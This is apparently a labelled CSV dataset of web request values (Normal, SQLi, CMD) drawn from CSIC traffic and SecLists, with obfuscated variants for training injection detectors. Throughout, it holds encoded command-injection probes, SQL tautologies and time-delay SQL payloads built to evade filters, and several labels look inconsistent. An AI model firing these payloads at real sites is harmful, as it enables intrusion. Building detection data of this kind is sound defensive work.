payload,label,source
%0\u0041%20s\u0074\u0072%3\u0044%24%28e\u0063h\u006f%20\u0058EL\u0050PN%29%0A%20\u0073\u0074r1%3\u0044%24%7\u0042%23st\u0072%7D%0\u0041%20\u0069f%20%5B%209%20-n\u0065%20%24%7Bst\u00721%7D%20%5\u0044%0A%20\u0074\u0068e\u006e%20sl\u0065ep%200%0A%20\u0065ls\u0065%20s\u006ce\u0065p%201%0\u0041%20fi%20%2522,CMD,obfuscation:unicode_escape
eval(atob('Qzc3MjkzM0M1ODdGQkM2MjE5NjAxRjFGOThCOEFCRUE=')),SQLi,obfuscation:base64_fragment
Calle%2BVirgen%2BDe%2BLa%2BEstrella%2C%2B150%2C%2B,SQLi,obfuscation:url_encode
%26echo%20%00XUKFFI$((79%2B7))$(echo%20XUKFFI)XUKFFI,CMD,obfuscation:null_byte
B6753AB3E96E8B6B87BC%00558917092869,SQLi,obfuscation:null_byte
H3RetiCal,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('JTBBJTIwc3RyJTNEJTI0JTI4ZWNobyUyME5FVEVCVCUyOSUwQSUyMA=='))str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,obfuscation:base64_fragment
santitor,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%0\u0061e\u0063h\u006f$\u0049\u0046S\u004e\u0055A\u0050\u004bN$((22%2\u004215))$(ec\u0068o$I\u0046SNU\u0041\u0050K\u004e)\u004eU\u0041\u0050\u004b\u004e&,CMD,obfuscation:unicode_escape
%2527%26echo%2520BQAOON%24%28%2814%252B21%29%29%24%28echo%2520BQAOON%29BQAOON%2527,CMD,obfuscation:url_encode
0282DC0A043B0FBC6540247F6A94C7EE/*--*/,SQLi,obfuscation:nested_comment
%2527%3B%20STR%3D%24%28EcHO%20nSSnsT%29%3b%20Str1%3d%24%7b%23stR%7d%3B%20if%20%5b%209%20-Ne%20%24%7bSTR1%7d%20%5D%3b%20Then%20Sleep%200%3B%20else%20sleep%201%3B%20fi%20%5c%5C,CMD,obfuscation:case_random
%2522%7C%20%5B%201%20-ne%20%24%28echo%20BWWRBC%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%%005C%5C,CMD,obfuscation:null_byte
"--WebKitFormBoundary73390
Content-Disposition: form-data; name=""q""

%7C%20%5B%203%20-ne%20%24%28echo%20CWNAMN%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22
--WebKitFormBoundary73390--",CMD,obfuscation:multipart_boundary_sim
chandras' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%252522%253B%2520str%253D%2524%2528echo%2520RNIVNR%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25209%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2F%2F,CMD,obfuscation:url_encode
%27%26EcHO$ifsnWJcNK$((78%2b98))$(ECho$iFSNwJCnK)nWJcnk%26,CMD,obfuscation:case_random
"--WebKitFormBoundary52357
Content-Disposition: form-data; name=""q""

modo=entrar&login=lilllie8&pwd=4mpo599c7mientoSet-cookie%3A+Tamper%3D1041264011025374727&remember=on&B1=Entrar
--WebKitFormBoundary52357--",SQLi,obfuscation:multipart_boundary_sim
86D24A798964E89EC800C61E583426A8,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527print%2528%2560echo%252520DUAYMM%2560.%2560echo%252520%2524%2528%252877%25252B73%2529%2529%2560.%2560echo%252520DUAYMM%2560.%2560echo%252520DUAYMM%2560%2529%25253BDUAYMM,CMD,obfuscation:double_url_encode
N�rez+Muriscot,Normal,csic_gsi:cisc_normalTraffic_train.txt
44143,Normal,csic_gsi:cisc_normalTraffic_train.txt
bainton3,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Mo�as+S/N,+' OR '1'='1",SQLi,obfuscation:logic_or_tautology
FA579A88A23385096DEBB311F898E845,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=1&id=m8n71leta,SQLi,obfuscation:hpp_duplicate_param
"""%3\u0042ec\u0068\u006f%20\u0057R\u0059I\u0043W$((92%2\u00429))$(ec\u0068o%20WRY\u0049C\u0057)\u0057RYI\u0043W%7C",CMD,obfuscation:unicode_escape
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20EZDZJG%29%20%26%26%20str1%3D%24%7B%%0023str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23,CMD,obfuscation:null_byte
"CONCAT(CHAR(51),CHAR(57),CHAR(56),CHAR(49),CHAR(51))",SQLi,obfuscation:char_function
F91125A91949F8C1%00B4075322534AB74B,SQLi,obfuscation:null_byte
6F1BCCEAFF3B662455F9E78D6C94F514,Normal,csic_gsi:cisc_normalTraffic_train.txt
34CA57FBB8206B5DA737F4CB74958727,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7D54105C4685FC2DA68D12BA13189C33,Normal,csic_gsi:cisc_normalTraffic_train.txt
55D68E9409D3AF490BA2256BDE0A2968,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3B%20ｓtr%3D%24%28ｅchｏ%20KFNNBY%29%3B%20sｔr1%3D%24%7B%23ｓtr%7D%3B%20if%20%5B%203%20-ne%20%24%7Bsｔr1%7D%20%5D%3B%20ｔhｅｎ%20ｓleｅp%200%3B%20eｌｓｅ%20sｌｅep%201%3B%20fｉ%20%257C,CMD,obfuscation:unicode_normalization
corcheｔa,SQLi,obfuscation:unicode_normalization
%7Cｅchｏ$IFSFUOWKT$((11%2B83))$(echo$IFSFUOWKT)FUOWKT',CMD,obfuscation:unicode_normalization
"""%7C%7Cecho%20JDTYJX$((18%2B24))$(echo%20JDTYJX)JDTYJX//",CMD,seclists_cmd
"modo=registro&login=soliman&password=85r7a4c2&nombre=Shiirly&apellidos=Margarit+Gallardo&email=asther@ringringrent.bj&dni=20514170X&direccion=Navalafuente,+42+&ciudad=Santa+Cruz+de+Pinares&cp=37510&provincia=Zaragoza&ntc=6014094757095594&B1A=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
'.prｉnt(`ｅchｏ%20IINFPE\nｅcho%20$((95%2B84))\necho%20IINFPE\nｅcho%20IINFPE`)%3B.%25252527IINFPE,CMD,obfuscation:unicode_normalization
23m6�,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"eval(atob('J3x8ZWNobyUyMEdQQkVHViQoKDIwJTJCMzQpKSQoZWNobyUyMEdQQg=='))EGV)GPBEGV""",CMD,obfuscation:base64_fragment
"Calle+San+Lazaro,+115,+4-B",Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%26echo%20ZOUFKS$((71%2B23))$(echｏ%20ZOUFKS)ZOUFKS%22,CMD,obfuscation:unicode_normalization
D4F0507BB8702BE9E7551F90779430DE,Normal,csic_gsi:cisc_normalTraffic_train.txt
"--WebKitFormBoundary75373
Content-Disposition: form-data; name=""q""

Tarciano
--WebKitFormBoundary75373--",SQLi,obfuscation:multipart_boundary_sim
eval(atob('NDI5MDAxMzM0NjgyNjU5MQ==')),SQLi,obfuscation:base64_fragment
%26%20\u0073\u006ceep%200%20%26%26%20\u0073tr%3\u0044%24%28e\u0063h\u006f%20\u0050D\u004fPTJ%29%20%26%26%20s\u0074r1%3\u0044%24%7B%23\u0073\u0074r%7D%20%26%26%20%5B%209%20-\u0065q%20%24%7Bstr1%7D%20%5D%20%26%26%20\u0073\u006ce\u0065p%201%20//,CMD,obfuscation:unicode_escape
%3B%20str%3D%24%28echo%20POHUXH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20s%00leep%200%3B%20else%20sleep%201%3B%20fi%20%23,CMD,obfuscation:null_byte
FBAB45E512088EF33BDAC8AC99C677A0' OR '1'='1,SQLi,obfuscation:logic_or_tautology
103204D\u004441\u004644DB83\u00427A\u004344\u00459110D\u004263,SQLi,obfuscation:unicode_escape
"--WebKitFormBoundary14616
Content-Disposition: form-data; name=""q""

3B074F17D0F59B186FCD2F3D0FED7179
--WebKitFormBoundary14616--",SQLi,obfuscation:multipart_boundary_sim
eval(atob('Y2xldmU=')),SQLi,obfuscation:base64_fragment
desl�nguido' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%22%26%20sleep%200%20%26%26%20\u0073tr%3D%24%28e\u0063ho%20A\u0054DESO%29%20%26%26%20\u0073\u0074r1%3D%24%7B%23st\u0072%7\u0044%20%26%26%20%5\u0042%208%20-e\u0071%20%24%7Bst\u00721%7D%20%5\u0044%20%26%26%20s\u006c\u0065ep%201%20,CMD,obfuscation:unicode_escape
&&ｅcho$IFSRZHDUN$((30%2B97))$(echｏ$IFSRZHDUN)RZHDUN%7C,CMD,obfuscation:unicode_normalization
6A6942E2142DFEEC61823EBB97E422B6,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=8977&B1A=Pasar+por+caja/*--*/,SQLi,obfuscation:nested_comment
eval(atob('ODk3RTdEMkI5OUE1MDA4MzZGMUEwNjc2MTIwMzRGQjQ=')),SQLi,obfuscation:base64_fragment
"--WebKitFormBoundary69524
Content-Disposition: form-data; name=""q""

30F46E310E48A76D22C8097B343C31D3
--WebKitFormBoundary69524--",SQLi,obfuscation:multipart_boundary_sim
eval(atob('bW9kbz1yZWdpc3RybyZsb2dpbj1wcmVzdG9uJnBhc3N3b3JkPTc5cw=='))C2&nombre=Dagmar&apellidos=Sesma+Jover&email=in@sietepeines.az&dni=33258579G&direccion=Profesor+Adolfo+Miaja+De+La+Muela+119+&ciudad=Torralba+de+Arag�n&cp=18513&provincia=Cantabria&ntc=2519120092887248&B1A=Registrar,SQLi,obfuscation:base64_fragment
%3B%20str%3D%24%28echo%20TSUCKA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2%002,CMD,obfuscation:null_byte
%26%20sleEP%200%20%26%26%20sTR%3D%24%28eCho%20ifmaPs%29%20%26%26%20sTR1%3D%24%7b%23str%7D%20%26%26%20%5B%207%20-eQ%20%24%7BsTR1%7D%20%5d%20%26%26%20sleEP%201%20%27,CMD,obfuscation:case_random
id=1&id=091137E84E4642ABBD35777B1FA33C66,SQLi,obfuscation:hpp_duplicate_param
%26%20\u0073\u006c\u0065\u0065\u0070%200%20%26%26%20\u0073t\u0072%3D%24%28\u0065\u0063\u0068o%20\u0057V\u0055PX\u0049%29%20%26%26%20str1%3D%24%7B%23s\u0074\u0072%7D%20%26%26%20%5\u0042%208%20-\u0065\u0071%20%24%7Bstr1%7D%20%5\u0044%20%26%26%20s\u006c\u0065ep%201%20%2522,CMD,obfuscation:unicode_escape
%25257C%25257Cecho%2524IFSHRKGCV%2524%2528%252826%25252B87%2529%2529%2524%2528echo%2524IFSHRKGCV%2529HRKGCV%257C,CMD,obfuscation:double_url_encode
7A4A2E1CC2379E659D8B7383863949CC,Normal,csic_gsi:cisc_normalTraffic_train.txt
"id=1&id=h2dr/,os55t64amente",SQLi,obfuscation:hpp_duplicate_param
40FF65CA4028CA4D595DECC155DB36D0,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=mile&pwd=DEs9I852d268&remember=on/&B1=Entrar/*--*/,SQLi,obfuscation:nested_comment
50A83EF40C932D250C54FE4BE8DF471E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27||echo%20RTVDXH%00$((26%2B45))$(echo%20RTVDXH)RTVDXH//,CMD,obfuscation:null_byte
Barrera+Medio,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('JTdDJTIwJTVCJTIwNCUyMC1uZSUyMCUyNCUyOGVjaG8lMjBGWVhQTQ=='))Z%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,CMD,obfuscation:base64_fragment
F91125A91949F8C1B4075322534AB74B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%252522%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520YBJQLF%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25207%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%255C%255C,CMD,obfuscation:url_encode
BA3E9CA080C18B03A1AA743461D926D2,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
70StAJe,SQLi,obfuscation:case_random
"--WebKitFormBoundary89155
Content-Disposition: form-data; name=""q""

%20echo%20YPBKYU$((68%2B53))$(echo%20YPBKYU)YPBKYU""
--WebKitFormBoundary89155--",CMD,obfuscation:multipart_boundary_sim
%0A%20str%3D%24%28echo%20JTZCSG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C,CMD,seclists_cmd
63E5211399964BCAA905EEB48908B027,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%257C%257Cecho%252520OVDJWG%2524%2528%252812%25252B73%2529%2529%2524%2528echo%252520OVDJWG%2529OVDJWG%252522,CMD,obfuscation:double_url_encode
%3B%20str%3D%24%28echo%20CHSJVY%29%3B%00%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,CMD,obfuscation:null_byte
"--WebKitFormBoundary82261
Content-Disposition: form-data; name=""q""

don
--WebKitFormBoundary82261--",SQLi,obfuscation:multipart_boundary_sim
E\u00430D872BB\u004404B7\u0043\u0041E\u0046306BF2A45845\u0042D,SQLi,obfuscation:unicode_escape
%2524%257Bsystem%2528print%2528%2560echo%252520IWAAGD%255Cnecho%252520%2524%2528%252870%25252B17%2529%2529%255Cnecho%252520IWAAGD%255Cnecho%252520IWAAGD%2560%2529%25253B.%252525252527IWAAGD,CMD,obfuscation:double_url_encode
modo=insertar&precio=1302&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%7C%20%5B%205%20-ne%20%24%28echo%20TFJKCP%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27,CMD,seclists_cmd
743E671BD5E9CDB5BB2D17B1585AF8E2,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%205%20-ne%20%24%28echo%20TKXZEX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F' OR '1'='1,SQLi,obfuscation:logic_or_tautology
5AD32EB308A7150072E3934949716B03,Normal,csic_gsi:cisc_normalTraffic_train.txt
Llanes,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=chaz&password=5o205in2s5&nombre=Le�n&apellidos=Cerezo+Amatller&email=kilderhoff@soyrojo.ch&dni=13371492M&direccion=Camino+De+Los+Crisantemos+89,+9D&ciudad=Robregordo&cp=21590&provincia=Girona&ntc=3338979613455690&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
88865484Q/*--*/,SQLi,obfuscation:nested_comment
%27%0a%20STR%3D%24%28eChO%20jthMZi%29%0A%20str1%3D%24%7B%23STr%7D%0a%20iF%20%5b%207%20-ne%20%24%7BSTR1%7D%20%5D%0a%20THeN%20sLeEp%200%0a%20elSe%20SleEP%201%0a%20Fi%20%23,CMD,obfuscation:case_random
Castrillo+de+Villavega,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%0A%20stR%3d%24%28ecHO%20NfJeZO%29%0a%20STR1%3d%24%7b%23STr%7D%0A%20If%20%5B%202%20-Ne%20%24%7BsTr1%7d%20%5D%0a%20thEN%20sLeeP%200%0A%20ElsE%20SlEEp%201%0a%20fi%20%2522,CMD,obfuscation:case_random
"\u006d\u006fdo=r\u0065gi\u0073\u0074ro&log\u0069n=\u006c\u0065rch&p\u0061ss\u0077\u006fr\u0064=5\u0065l\u0061s2o\u006d\u0061t�2eo&n\u006fm\u0062r\u0065=Alci\u0072a&\u0061pe\u006c\u006c\u0069\u0064\u006f\u0073=\u0046\u006frn�s+Ko\u0068l\u0073&\u0065m\u0061\u0069l=\u0062us\u0063\u0068@\u0073h\u006f\u0077.\u006eo\u006d.n\u0061&dn\u0069=71246547E&\u0064ire\u0063ci\u006fn=\u0046\u0072\u0061\u006e\u0063i\u0073c\u006f+Ni�o,+100+&c\u0069ud\u0061\u0064=\u004d\u0061ra\u007a\u006f\u006cej\u0061&\u0063p=19144&pr\u006f\u0076\u0069n\u0063\u0069a=V\u0061\u006cl\u0061d\u006f\u006ci\u0064&n\u0074c=2373775613776198&B1=""+A\u004eD+""1""=""1",SQLi,obfuscation:unicode_escape
salina-sonajew@almeriastella.vg,Normal,csic_gsi:cisc_normalTraffic_train.txt
"""+AND+""1""=""1",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('JTI1MjIlM0IlMjBzdHIlM0QlMjQlMjhlY2hvJTIwVVNVTkpQJTI5JQ=='))3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,CMD,obfuscation:base64_fragment
%2527%0A%20stR%3D%24%28ECHO%20gGPyar%29%0A%20str1%3D%24%7B%23Str%7D%0A%20if%20%5b%204%20-nE%20%24%7BstR1%7D%20%5d%0a%20ThEN%20SlEEP%200%0a%20elsE%20sleep%201%0a%20Fi%20%2522,CMD,obfuscation:case_random
modo%3Dregistro%26login%3Dkanya%26password%3D6a%2Fd%270%27ug22a%26nombre%3DAngelo%26apellidos%3DGoya%2BAsensio%26email%3Dbowers%40puntodevistafotografia.gf%26dni%3D56007542N%26direccion%3DC%2F%2BBaja%2B58%2C%2B1%3FH%26ciudad%3DHelechosa%2Bde%2Blos%2BMontes%26cp%3D10181%26provincia%3DValencia%26ntc%3D8914897432837758%26B1%3DRegistrar,SQLi,obfuscation:url_encode
eval(atob('JTI2JTIwc2xlZXAlMjAwJTIwJTI2JTI2JTIwc3RyJTNEJTI0JTI4ZQ=='))cho%20CJCSGG%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%26,CMD,obfuscation:base64_fragment
%2522%7C%20%5B%204%20-ne%20%24%28echo%20BWWRBC%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%5C%5C,CMD,seclists_cmd
"--WebKitFormBoundary50664
Content-Disposition: form-data; name=""q""

8D764425FF3C6121E4CF296D1227A83E
--WebKitFormBoundary50664--",SQLi,obfuscation:multipart_boundary_sim
%0A%20StR%3d%24%28ecHo%20dpbaVn%29%0A%20STR1%3D%24%7B%23StR%7D%0A%20IF%20%5B%203%20-Ne%20%24%7BsTr1%7d%20%5d%0a%20THeN%20sLEep%200%0A%20elSe%20sleEP%201%0A%20fi%20%27,CMD,obfuscation:case_random
modo=insertar&precio=9334&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Passatge+Cala+Ratjada+127,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
15957014M,Normal,csic_gsi:cisc_normalTraffic_test.txt
56BB03D64628E57EE2E395C14D140066,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%3B%20str%3D%24%28echo%20BAQATA%29%3B%20str1%3D%24%7B%00%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,CMD,obfuscation:null_byte
e4F6B81c0177e02849B14F782C8B8e88,SQLi,obfuscation:case_random
Rafael+Orozco+141+12?H,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3BD874CE162E81CD3F4110C299F3EC10,Normal,csic_gsi:cisc_normalTraffic_train.txt
1515784011485663,Normal,csic_gsi:cisc_normalTraffic_test.txt
%250A%2520str%253D%2524%2528echo%2520EIGKOY%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25204%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%25252F%25252F,CMD,obfuscation:url_encode
%252527%25250aecho%252520YJUICB%2524%2528%252852%25252B55%2529%2529%2524%2528echo%252520YJUICB%2529YJUICB%2526,CMD,obfuscation:double_url_encode
%0A%20str%3D%24%28echo%20NFRBHV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
0E9C3C88835D6DDB5811F51A43700860/*--*/,SQLi,obfuscation:nested_comment
8CBBAC92C69F4B1500F0AAB7D129D534,Normal,csic_gsi:cisc_normalTraffic_test.txt
"{""a"":{""b"":""schiaftino@showenvivo.com.sy');waitfor+delay+'0:0:15';--""}}",SQLi,obfuscation:json_nested_escape
"--WebKitFormBoundary54447
Content-Disposition: form-data; name=""q""

'+theolog'o
--WebKitFormBoundary54447--",SQLi,obfuscation:multipart_boundary_sim
D5699F392B5A5DC4\u00415\u00446F0F800B\u00416\u0043\u00441,SQLi,obfuscation:unicode_escape
"--WebKitFormBoundary40042
Content-Disposition: form-data; name=""q""

%0A%20str%3D%24%28echo%20BRBPJX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526
--WebKitFormBoundary40042--",CMD,obfuscation:multipart_boundary_sim
%257C%257Cecho%24IFSOQAOQJ%24%28%2862%252B26%29%29%24%28echo%24IFSOQAOQJ%29OQAOQJ%2527,CMD,obfuscation:url_encode
03028605B/*--*/,SQLi,obfuscation:nested_comment
%2522%253Becho%2520MDLILU%24%28%2859%252B57%29%29%24%28echo%2520MDLILU%29MDLILU%7C,CMD,obfuscation:url_encode
9178B937A7\u00412D1\u0041BF8\u00459570086EA8911,SQLi,obfuscation:unicode_escape
5213AED8EB70100DFD9B1C524A7BF3C7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%25257C%252520%25255B%2525202%252520-ne%252520%252524%252528echo%252520JLUGPX%252520%25257C%252520tr%252520-d%252520%252527%25255Cn%252527%252520%25257C%252520wc%252520-c%252529%252520%25255D%252520%25257C%25257C%252520sleep%2525201%252520%25252522,CMD,obfuscation:double_url_encode
5F428EC4F588BDEC9FD4E1D60FCB3C9A,Normal,csic_gsi:cisc_normalTraffic_test.txt
"CONCAT(CHAR(83),CHAR(97),CHAR(108),CHAR(97),CHAR(109),CHAR(97),CHAR(47),CHAR(110),CHAR(99),CHAR(97))",SQLi,obfuscation:char_function
Rangle' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20JICOQS%29%20%26%26%20str1%3%00D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,obfuscation:null_byte
id=1&id=rectificadora,SQLi,obfuscation:hpp_duplicate_param
"--WebKitFormBoundary25828
Content-Disposition: form-data; name=""q""

65DAA902261882A966A0F9E4656942AC
--WebKitFormBoundary25828--",SQLi,obfuscation:multipart_boundary_sim
"id=1&id=1','0','0','0','0');waitfor+delay+'0:0:15';--",SQLi,obfuscation:hpp_duplicate_param
%27%3Becho$IFSRZLSCU$((35%2B98))$(echo$IFSRZ%00LSCU)RZLSCU&,CMD,obfuscation:null_byte
eval(atob('JTI1MjIlMjYlMjBzbGVlcCUyMDAlMjAlMjYlMjYlMjBzdHIlM0QlMg=='))4%28echo%20JWEAWE%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%26,CMD,obfuscation:base64_fragment
eval(atob('JTIwZWNobyUyMFZES0tUVSQoKDQ4JTJCMzkpKSQoZWNobyUyMFZESw=='))KTU)VDKKTU',CMD,obfuscation:base64_fragment
%252522%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520VAVICY%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25208%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%25257C,CMD,obfuscation:url_encode
01F00507F1DCCD4A18FE214AD94E069F,Normal,csic_gsi:cisc_normalTraffic_test.txt
47AEDF684AB5E550943481009A0FBAB1/*--*/,SQLi,obfuscation:nested_comment
id=1&id=E3D4C5D09BF8431545F343A294EAA909,SQLi,obfuscation:hpp_duplicate_param
');}priｎｔ(`ｅchｏ%20UXXDJD\ｎechｏ%20$((17%2B17))\ｎｅcho%20UXXDJD\necho%20UXXDJD`)%3B.%25252522UXXDJD,CMD,obfuscation:unicode_normalization
79B11435D3CDF8DE5AF4346DF71D1E72,Normal,csic_gsi:cisc_normalTraffic_train.txt
"insertar','0','0','0');waitfor+delay+'0:0:15';--",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
21D3E1A94FCF62FC226CC408456E0B69,Normal,csic_gsi:cisc_normalTraffic_train.txt
%252526%252520sleep%2525200%252520%252526%252526%252520str%25253D%252524%252528echo%252520ZYXRFF%252529%252520%252526%252526%252520str1%25253D%252524%25257B%252523str%25257D%252520%252526%252526%252520%25255B%2525203%252520-eq%252520%252524%25257Bstr1%25257D%252520%25255D%252520%252526%252526%252520sleep%2525201%252520%252526,CMD,obfuscation:double_url_encode
"--WebKitFormBoundary13267
Content-Disposition: form-data; name=""q""

""%3Becho%20WRYICW$((92%2B9))$(echo%20WRYICW)WRYICW%7C
--WebKitFormBoundary13267--",CMD,obfuscation:multipart_boundary_sim
"{""a"":{""b"":""apad-r8nad5ra""}}",SQLi,obfuscation:json_nested_escape
eval(atob('UmVnaXN0cmFyKw==')),SQLi,obfuscation:base64_fragment
eval(atob('Z2hlbmFpZW1fYmVybGluQGhpcG90ZWNhc2NvbS5qZQ==')),SQLi,obfuscation:base64_fragment
Camats+Tafolla,Normal,csic_gsi:cisc_normalTraffic_test.txt
47513/*--*/,SQLi,obfuscation:nested_comment
'%26ECHo%20nKMKNI$((64%2b82))$(ECho%20nKMKNi)nKMKni%5C%5C,CMD,obfuscation:case_random
eval(atob('dGFybGU=')),SQLi,obfuscation:base64_fragment
7361,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('ZWNobyRJRlNKRVBaSFckKCg3MyUyQjczKSkkKGVjaG8kSUZTSkVQWg=='))HW)JEPZHW%22,CMD,obfuscation:base64_fragment
id=1&id=id=2&nombre=Jam�n+Ib�rico&precio=85&cantidad=25%3F&B1=A�adir+al+carrito,SQLi,obfuscation:hpp_duplicate_param
eval(atob('JTdDZWNobyUyMFlIUVZSSiQoKDM5JTJCNDEpKSQoZWNobyUyMFlIUQ=='))VRJ)YHQVRJ%26,CMD,obfuscation:base64_fragment
AE13212E1C740963D4BA7F%007C35BF3412,SQLi,obfuscation:null_byte
